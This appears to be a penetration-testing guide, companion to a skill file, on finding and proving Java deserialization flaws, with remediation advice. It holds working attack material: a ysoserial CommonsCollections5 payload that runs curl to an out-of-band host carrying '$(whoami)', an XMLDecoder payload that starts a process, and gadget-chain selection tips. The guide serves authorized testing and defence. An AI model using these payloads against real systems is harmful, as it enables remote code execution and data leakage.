# Java Deserialization — Deep Workflows

Companion to SKILL.md. Sink identification, ysoserial usage, safe proof.

## Step 1: Identify serialization surfaces

```bash
# Magic bytes in request bodies/cookies:
#   ACED0005          Java serialization stream header
#   rO0AB             same, base64-encoded (cookies, params)
#   H4sIA             gzip-wrapped serialized object
curl -s -b "session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA..." https://target/

# Source/decompiled code sinks (jadx/cfr output):
grep -rEn "ObjectInputStream|readObject\(|XMLDecoder|XStream|fromXML" src/
grep -rEn "\.readUnshared|ObjectInputFilter" src/    # protections present?

# Frameworks known to shuttle serialized objects:
#   JSF ViewState, Spring session persistence, JBoss/Tomcat managers,
#   RMI/JMX endpoints, ActiveMQ/Kafka payloads.
```

## Step 2: URLDNS — the SAFE detector first

```bash
# Always start with URLDNS gadget: triggers DNS lookup only. No code exec.
java -jar ysoserial.jar URLDNS "http://<oob-id>.oast.pro/detect" > p.ser
base64 -w0 p.ser > p.b64
# Place into cookie/param where original serialized blob lived; send once.
# OOB DNS callback = deserialization CONFIRMED + blind-safe evidence.
```

## Step 3: Gadget selection ladder

```text
After URLDNS confirms, check classpath hints for available gadgets:
  Commons-Collections 3.x/4.x  -> CC1..CC7 chains
  Commons-Beanutils            -> BeanUtils chain
  Spring AOP/Core              -> Spring1/Spring2
  Groovy                       -> Groovy1
  Hibernate                    -> various
Craft command payloads that produce OBSERVABLE side effects only:
  curl/wget to your OOB host with $(id) in URL path
  file write into webroot IF scope explicitly allows and cleanup possible
NEVER: rm, reverse shells to third parties, crypto-lockers, data drops.
```

```bash
java -jar ysoserial.jar CommonsCollections5 "curl http://<oob>.oast.pro/$(whoami)" \
  > cc5.ser
```

## Step 4: Transport encodings

```text
raw bytes -> application/x-java-serialized-object
base64    -> cookies, params, JSON string fields
gzip      -> H4sIA prefix; some stacks auto-decompress
XML       -> XStream fromXML endpoints accept XML gadget graphs
ViewState -> base64 within viewstate param; may need padding/key handling
           (documented no-key vs known-key classes differ)
```

## Step 5: XMLDecoder / XStream variants

```xml
<!-- XMLDecoder payload class -->
<java version="1.8" class="java.beans.XMLDecoder">
 <object class="java.lang.ProcessBuilder">
  <array class="java.lang.String"><string>id</string></array>
  <method name="start"/>
 </object>
</java>

<!-- XStream style: depends on enabled converters; probe with simple
     dynamic-proxy conversion first for OOB confirmation. -->
```

## Step 6: JNDI injection gatekeeping

When gadgets reach InitialContext lookups (log4shell-class patterns):
prove via DNS-only callback from target egress; document JDK version
mitigation state honestly; never fetch remote classes beyond detection.

## False-positive elimination

1. URLDNS callback must come from TARGET egress IP (not your prefetch).
2. Confirm the exact parameter is deserialized (mutate one byte -> parse
   error changes response).
3. Version-pin gadget availability: chain failing ≠ service patched;
   check error text distinguishing ClassNotFound vs blocked.

## Remediation guidance

```text
- Prefer pure data formats (JSON) over native serialization at trust edges.
- JEP 290 ObjectInputFilter allowlists on every readObject site:
  -Djdk.serialFilter="com.app.dto.*;!*"
- Upgrade gadget libraries (commons-collections4 with safe config).
- Sign+encrypt serialized blobs AND verify before deserialize.
```
